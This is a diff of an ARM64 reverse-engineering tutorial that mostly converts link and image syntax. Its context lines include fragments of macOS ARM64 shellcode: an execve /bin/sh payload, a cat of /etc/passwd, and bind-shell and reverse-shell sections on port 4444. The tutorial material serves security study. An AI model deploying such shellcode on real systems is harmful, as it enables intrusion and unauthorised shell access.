@@ -1,6 +1,5 @@
 # Introduction to ARM64v8
 
-
 ## **Exception Levels - EL (ARM64v8)**
 
 In ARMv8 architecture, execution levels, known as Exception Levels (ELs), define the privilege level and capabilities of the execution environment. There are four exception levels, ranging from EL0 to EL3, each serving a different purpose:
@@ -67,8 +66,7 @@ They are often used to store the **base address of the thread-local storage** re
 **PSTATE** contains several process components serialized into the operating-system-visible **`SPSR_ELx`** special register, being X the **permission** **level of the triggered** exception (this allows to recover the process state when the exception ends).\
 These are the accessible fields:
 
-![[../../../images/image (1196).png|]]
-
+![](../../../images/image (1196).png)
 
 - The **`N`**, **`Z`**, **`C`** and **`V`** condition flags:
   - **`N`** means the operation yielded a negative result
@@ -99,7 +97,7 @@ When reading a function in assembly, look for the **function prologue and epilog
 
 ### Calling Convention in Swift
 
-Swift have its own **calling convention** that can be found in [[https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64|**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**]]
+Swift have its own **calling convention** that can be found in [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)
 
 ## **Common Instructions (ARM64v8)**
 
@@ -234,7 +232,7 @@ ARM64 instructions generally have the **format `opcode dst, src1, src2`**, where
 ```armasm
 stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
 ```
-```
+
 2. **Set up the new frame pointer**: `mov x29, sp` (sets up the new frame pointer for the current function)
 3. **Allocate space on the stack for local variables** (if needed): `sub sp, sp, <size>` (where `<size>` is the number of bytes needed)
 
@@ -246,7 +244,7 @@ stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement t
 ```armasm
 ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
 ```
-```
+
 3. **Return**: `ret` (returns control to the caller using the address in the link register)
 
 ## AARCH32 Execution State
@@ -270,7 +268,7 @@ _start:
     mov r0, #0
     mov r0, #8
 ```
-```
+
 ### Registers
 
 There are 16 32-bit registers (r0-r15). **From r0 to r14** they can be used for **any operation**, however some of them are usually reserved:
@@ -288,8 +286,7 @@ This is done by **saving the processor state from the `CPSR` to the `SPSR`** of 
 
 In AArch32 the CPSR works similar to **`PSTATE`** in AArch64 and is also stored in **`SPSR_ELx`** when a exception is taken to restore later the execution:
 
-![[../../../images/image (1197).png|]]
-
+<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>
 
 The fields are divided in some groups:
 
@@ -313,8 +310,7 @@ The fields are divided in some groups:
 - **`E`** bit: Indicates the **endianness**.
 - **Mode and Exception Mask Bits** (0-4): They determine the current execution state. The **5th** one indicates if the program runs as 32bit (a 1) or 64bit (a 0). The other 4 represents the **exception mode currently in used** (when a exception occurs and it's being handled). The number set **indicates the current priority** in case another exception is triggered while this is being handled.
 
-![[../../../images/image (1200).png|]]
-
+<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>
 
 - **`AIF`**: Certain exceptions can be disabled using the bits **`A`**, `I`, `F`. If **`A`** is 1 it means **asynchronous aborts** will be triggered. The **`I`** configures to respond to external hardware **Interrupts Requests** (IRQs). and the F is related to **Fast Interrupt Requests** (FIRs).
 
@@ -322,11 +318,11 @@ The fields are divided in some groups:
 
 ### BSD syscalls
 
-Check out [[https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master|**syscalls.master**]] or run `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls will have **x16 > 0**.
+Check out [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) or run `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls will have **x16 > 0**.
 
 ### Mach Traps
 
-Check out in [[https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html|**syscall_sw.c**]] the `mach_trap_table` and in [[https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h|**mach_traps.h**]] the prototypes. The mex number of Mach traps is `MACH_TRAP_TABLE_COUNT` = 128. Mach traps will have **x16 < 0**, so you need to call the numbers from the previous list with a **minus**: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.
+Check out in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) the `mach_trap_table` and in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) the prototypes. The mex number of Mach traps is `MACH_TRAP_TABLE_COUNT` = 128. Mach traps will have **x16 < 0**, so you need to call the numbers from the previous list with a **minus**: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.
 
 You can also check **`libsystem_kernel.dylib`** in a disassembler to find how to call these (and BSD) syscalls:
 
@@ -337,7 +333,7 @@ dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Lib
 # iOS
 dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
 ```
-```
+
 Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.
 
 > [!TIP]
@@ -357,7 +353,7 @@ For example the call `gettimeofdate` reads the value of `timeval` directly from 
 
 It's super common to find this function used in Objective-C or Swift programs. This function allows to call a method of an objective-C object.
 
-Parameters ([[https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)|more info in the docs]]:
+Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):
 
 - x0: self -> Pointer to the instance
 - x1: op -> Selector of the method
@@ -382,7 +378,7 @@ So, if you put breakpoint before the branch to this function, you can easily fin
 whoami
 )
 ```
-```
+
 > [!TIP]
 > Setting the env variable **`NSObjCMessageLoggingEnabled=1`** it's possible to log when this function is called in a file like `/tmp/msgSends-pid`.
 >
@@ -417,7 +413,7 @@ ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/Comm
 # You could also use this
 ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
 ```
-```
+
 To extract the bytes:
 
 ```bash
@@ -426,7 +422,7 @@ for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ;
     echo -n '\\x'$c
 done
 ```
-```
+
 For newer macOS:
 
 ```bash
@@ -435,10 +431,10 @@ for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ;
     echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
 done
 ```
-```
 
-**C code to test the shellcode**
+<details>
 
+<summary>C code to test the shellcode</summary>
 
 ```c
 // code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
@@ -485,13 +481,15 @@ int main(int argc, char **argv) {
     return 0;
 }
 ```
-```
+
+</details>
 
 #### Shell
 
-Taken from [[https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s|**here**]] and explained.
+Taken from [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) and explained.
 
-**with adr**
+{{#tabs}}
+{{#tab name="with adr"}}
 
 ```armasm
 .section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
@@ -507,9 +505,10 @@ _main:
 
 sh_path: .asciz "/bin/sh"
 ```
-```
 
-**with stack**
+{{#endtab}}
+
+{{#tab name="with stack"}}
 
 ```armasm
 .section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
@@ -524,7 +523,7 @@ _main:
     movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
     movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.
 
-    str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8.
+    str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.
 
     ; Prepare arguments for the execve syscall.
 
@@ -539,9 +538,10 @@ _main:
     svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.
 
 ```
-```
 
-**with adr for linux**
+{{#endtab}}
+
+{{#tab name="with adr for linux"}}
 
 ```armasm
 ; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
@@ -558,8 +558,9 @@ _main:
 
 sh_path: .asciz "/bin/sh"
 ```
-```
 
+{{#endtab}}
+{{#endtabs}}
 
 #### Read with cat
 
@@ -589,7 +590,7 @@ cat_path: .asciz "/bin/cat"
 .align 2
 passwd_path: .asciz "/etc/passwd"
 ```
-```
+
 #### Invoke command with sh from a fork so the main process is not killed
 
 ```armasm
@@ -634,10 +635,10 @@ sh_c_option: .asciz "-c"
 .align 2
 touch_command: .asciz "touch /tmp/lalala"
 ```
-```
+
 #### Bind shell
 
-Bind shell from [[https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s|https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s]] in **port 4444**
+Bind shell from [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) in **port 4444**
 
 ```armasm
 .section __TEXT,__text
@@ -720,10 +721,10 @@ call_execve:
     mov  x16, #59
     svc  #0x1337
 ```
-```
+
 #### Reverse shell
 
-From [[https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s|https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s]], revshell to **127.0.0.1:4444**
+From [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell to **127.0.0.1:4444**
 
 ```armasm
 .section __TEXT,__text
@@ -791,7 +792,4 @@ call_execve:
     mov  x16, #59
     svc  #0x1337
 ```
-```
-
-
 
